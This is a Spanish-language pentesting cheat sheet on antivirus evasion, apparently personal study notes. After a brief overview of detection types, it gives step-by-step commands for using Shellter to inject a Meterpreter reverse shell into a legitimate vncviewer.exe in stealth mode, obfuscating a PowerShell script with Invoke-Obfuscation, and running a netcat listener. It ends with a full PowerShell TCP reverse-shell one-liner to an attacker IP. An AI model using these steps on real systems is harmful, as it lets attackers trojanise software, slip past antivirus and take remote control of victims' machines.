# Evasión de AntiVirus

Tags: #AV 

## Evasión de antivirus (AV)

Tags: #AV #Evasion #Shellter

Evadir las defensas: Consiste de una técnica que los adversarios usan para evitar la detección a través de su compromiso. Las técnicas usadas para la evasión incluyen desinstalar/deshabilitar los softwares de seguridad, o encriptar data y scripts. 

1. Signature based detection: Es una secuencia de bytes que únicamente identifican malware. Como resultado, tendrás que asegurarte que tu exploit o payload no encaje con cualquier firma conocida de la base de datos del AV. Podemos Bypass la firma basada en detección modificando la secuencia de byte del malware.
2. Heuristic based detection: Confía en reglas o decisiones para determinar si un binario es malicioso. 
3. Behavior based detection: Confía en identificar malware monitoreando su comportamiento. 
## Shellter

Nos ayuda a inyectar una ReverShell en un archivo legitimo ejecutables en Windows.
* [Shellter](https://www.shellterproject.com/introducing-shellter/)

```bash 
❯ apt install shellter                             # Instalamos Shellter, Shellter solo soporta 32 bit Payload
❯ apt install wine32
❯ dpkg --add-architecture i386 
```

```bash 
❯ cd /usr/share/windows-resources/shellter/        # Path donde se ecuentra Shellter

❯ wine shellter.exe                                # Ejecutamos Shellter
	❯ A                                           # Modo automatico 
	❯ /home/Desktop/AVBypass/vncviewer.exe        # Utilizaremos el 'vncviewer.exe' para inyectarle codigo malicioso
	❯ y                                           # Para que al momento de que se ejecute el .exe funcione con normalidad (Stealth mode)
	❯ L                                           # Listed payload or custom
	❯ 1                                           # Escogemos la opcion 1 (Meterpreter_Reverse_tcp)
	❯ <IP>                                        # Set LHOST del atacate
	❯ 443                                         # Set LPORT del atacante
```

Solo debemos de pasar el nuevo archivo .exe a la maquina victima y ejecutarlo para obtener la Revershell. 

## Ocultación con Powershell

Funciona en Windows 10 desactivando (Cloud-delivered protection, Automatic sample submission)

* [Obfuscation-Powershell](https://github.com/danielbohannon/Invoke-Obfuscation)
* [Revershell-Powershell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell)

Debemos de clonarnos el repo anterior y dentro de Powershell hacer lo siguiente. 
```bash 
❯ apt install powershell -y                            # Instalamos Powershell

❯ pwsh                                                 # Iniciamos Powershell en Linux
	❯ cd ./Invoke-obfuscation/ 
	❯ Import-Module ./Invoke-Obfuscation.psd1         # Importamos el modulo 
	❯ cd ..
	❯ Invoke-Obfuscation                              # Ejecutamos e iniciamos Invoke-Obfuscation

# Dentro de Invoke-Obfuscation
	❯ SET SCRIPTPATH /home/kali/shell.ps1             # Colocamos el tipo de Shell y la ruta absoluta de donde se encuentra
	❯ ENCODING 
		❯ 1                                          # 1 Tipo = ASCII
	❯ BACK
	❯ AST
		❯ ALL
			❯ 1
# Nos creara un nuevo archivo llamado 
❯ obfuscated.ps1                                      # Este archivo lo debemos de pasar por un servidor python y despues ejecutarlos en la maquina victima
❯ nc -nlvp 443                                        # Nos ponemos en modo escucha en la maquina de atacante para recibir la Reverse shell
```

```bash 
# Crearemos una Revershell  que la llamaremos shell.ps1, el cual colocaremos en la sig. ruta:
	# '/usr/share/windows-resources/shellter'

❯ $client = New-Object System.Net.Sockets.TCPClient('192.168.1.66',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte =  [text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```